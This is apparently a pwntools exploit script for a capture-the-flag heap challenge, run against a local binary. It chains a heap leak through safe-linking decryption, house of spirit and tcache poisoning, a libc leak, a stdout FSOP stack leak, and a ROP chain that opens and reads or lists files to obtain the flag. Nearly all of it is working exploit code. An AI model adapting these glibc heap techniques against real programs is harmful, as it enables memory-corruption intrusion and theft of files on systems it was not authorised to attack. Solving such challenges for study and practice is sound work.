#!/usr/bin/python3
from pwn import *

elf = ELF("../public/chall")
libc = ELF("../public/libc.so.6")
context.binary = elf

HOST = "127.0.0.1"
PORT = 9999

gs = """
continue
"""

IS_ORW = False
DIR = b".\0"
FLAG_NAME = b"flag-e9fa6b1fd75b2ae57fcb0e66790584.txt\0"


def start():
    if args.ORW:
        global IS_ORW
        IS_ORW = True
    if args.DEBUG:
        context.log_level = "debug"
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(elf.path)


def add(idx, name_size, name, price=None):
    if not price:
        price = idx

    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", str(name_size).encode())
    io.sendafter(b": ", str(price).encode())
    io.sendafter(b": ", name)

    return idx


def delete(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())


def view(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b": ", str(idx).encode())
    io.recvuntil(b"price: ")
    price = io.recvline().strip()
    io.recvuntil(b"name: ")
    name = io.recvline().strip()

    return name, price


def encrypt_safe_linking(addr, heap):
    return addr ^ (heap >> 12)


# from https://github.com/shellphish/how2heap/blob/master/glibc_2.36/decrypt_safe_linking.c
def decrypt_safe_linking(cipher):
    key, plain = 0, 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12

    return plain


def main():
    global io
    io = start()
    io.sendline(b"")  # skip intro

    def arbitrary_write(size, free_addr, what, where, debug=False):
        """
        Achieve arbitrary write primitive by using
        house of spirit and tcache poisoning technique.

        Example for `arbitrary_write(size=0x78, free_addr=heap+0x740, what, where)`:
        1) House of Spirit
            add(3, 0x78, p64(0x81) * 15)
            add(2, 0x78, p64(0x81) * 15)
            delete(3)
            delete(2)
            free_addr = heap + 0x740
            add(4, 0x18, p64(0) + p64(free_addr))
            delete(3) # freed chunk at `free_addr`

        2) Tcache Poisoning
            add(5, 0x78, p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x81) +
                p64(encrypt_safe_linking(where, heap+0x780)))
            add(5, 0x78, b".\0flag.txt\0")
            add(5, 0x78, what)
        """

        # 1) House of Spirit
        add(3, size, p64(size + 0x8 + 0x1) * 15)
        add(2, size, p64(size + 0x8 + 0x1) * 15)
        delete(3)
        delete(2)
        if debug:
            io.interactive()
        add(4, 0x18, p64(0) + p64(free_addr))
        delete(3)  # freed chunk at `free_addr`

        # 2) Tcache Poisoning
        assert where & 0xf == 0  # must be 16-byte aligned
        add(5, size, p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(size + 0x8 + 0x1) +
            p64(encrypt_safe_linking(where, free_addr+0x40)))
        add(5, size, DIR + FLAG_NAME)
        add(5, size, what)

    # =-=-= STAGE 1: LEAK HEAP =-=-=
    # by decrypting the safe linked address
    add(0, 0x28, b"leak_heap")
    add(1, 0x28, b"leak_heap")
    delete(0)
    delete(1)
    add(1, 0x28, b"\x69")  # it's okay to overwrite it by 1-byte
    leaks = view(1)
    print(leaks)
    heap = decrypt_safe_linking(u64(leaks[0].ljust(8, b"\x00"))) >> 12 << 12
    log.info(f"heap: {hex(heap)}")
    add(0, 0x28, b"reset_heap")

    # =-=-= STAGE 2: LEAK LIBC =-=-=
    # via unsorted chunk by making overlapping chunks via house of spirit

    # house of spirit
    add(2, 0x78, p64(0x91) * 15)
    add(3, 0x78, p64(0x91) * 15)
    free_addr = heap + 0x3c0
    for _ in range(7):  # fill 0x90 tcachebins by freeing the same chunk
        delete(3)
        delete(2)
        add(4, 0x18, p64(0) + p64(free_addr))  # arbitrary free
        delete(3)

        # realloc and overwriting chunk's tcache key
        add(3, 0x78, p64(0x91) * 15)
        add(2, 0x78, p64(0x91) * 15)

    # free once more to get unsorted chunk
    delete(3)
    delete(2)
    free_addr = heap + 0x430
    add(4, 0x18, p64(0) + p64(free_addr))  # arbitrary free
    delete(3)  # got unsorted chunk at heap + 0x430

    # leak it!!
    add(5, 0x78, b"A" * 48)
    leaks = view(5)
    libc.address = u64(leaks[0][48:].ljust(8, b"\x00")) - 0x219ce0
    log.info(f"libc: {hex(libc.address)}")

    # =-=-= STAGE 3: LEAK STACK =-=-=
    # by making overlapping chunks same as stage 2
    # and tcache poisoning to do stdout FSOP leak
    # (overwriting _IO_2_1_stdout_ to a fake file structure)

    # heap grooming
    delete(5)
    add(5, 0x78, b"A" * 40 + p64(0x91))
    add(5, 0x68, b"clear_unsorted")
    add(5, 0x78, b"reset_heap")

    # FSOP to leak environ to environ+6
    fake_file = flat(
        p64(0xfbad1800),  # _flags
        p64(0) * 3,  # _IO_read_*
        p64(libc.sym.environ),  # _IO_write_base
        p64(libc.sym.environ + 6),  # _IO_write_ptr
        p64(0),  # _IO_write_end
        p64(libc.sym.environ + 6),  # _IO_buf_base
        p64(libc.sym.environ + 6)  # _IO_buf_end
    )

    arbitrary_write(0x58, heap+0x5e0, fake_file, libc.sym._IO_2_1_stdout_)

    rip = u64(io.recvuntil(b"\x7f").ljust(8, b"\x00")) - 0x140
    log.info(f"rip: {hex(rip)}")

    # =-=-= STAGE 4: ROP =-=-=
    # by making overlapping chunks same as stage 2
    # and do tcache poisoning on those chunks
    # to overwrite rip with our rop chain

    dir_addr = heap + 0x620
    log.info(f"dir_addr: {hex(dir_addr)}")

    flag_addr = dir_addr + len(DIR)
    log.info(f"flag_addr: {hex(flag_addr)}")

    # construct rop chain
    rop = ROP(libc)
    syscall = rop.find_gadget(["syscall", "ret"]).address
    if IS_ORW:
        # open(flag_addr, 0)
        rop(rax=2, rdi=flag_addr, rsi=0)
        rop.raw(syscall)

        # read(3, flag_addr, 0x60)
        rop(rax=0, rdi=3, rsi=flag_addr, rdx=0x60)
        rop.raw(syscall)

        # write(1, flag_addr, 0x60)
        rop(rax=1, rdi=1, rsi=flag_addr, rdx=0x60)
        rop.raw(syscall)
    else:
        # open(dir_addr, 0)
        rop(rax=2, rdi=dir_addr, rsi=0)
        rop.raw(syscall)

        # getdents(3, dir_addr, 0x200)
        rop(rax=0x4e, rdi=3, rsi=dir_addr, rdx=0x200)
        rop.raw(syscall)

        # write(1, dir_addr, 0x200)
        rop(rax=1, rdi=1, rsi=dir_addr, rdx=0x200)
        rop.raw(syscall)

    # print(rop.dump())
    rop_chain_part1 = rop.chain()[:0x68]
    rop_chain_part2 = rop.chain()[0x68:]

    arbitrary_write(0x68, heap+0x730, rop_chain_part2, rip-0x8+0x70)
    arbitrary_write(0x78, heap+0x8a0, b"A" * 8 +
                    rop_chain_part1, rip-0x8)

    # =-=-= STAGE 5: PROFIT =-=-=
    io.recvuntil(b".")
    io.interactive()


if __name__ == "__main__":
    main()
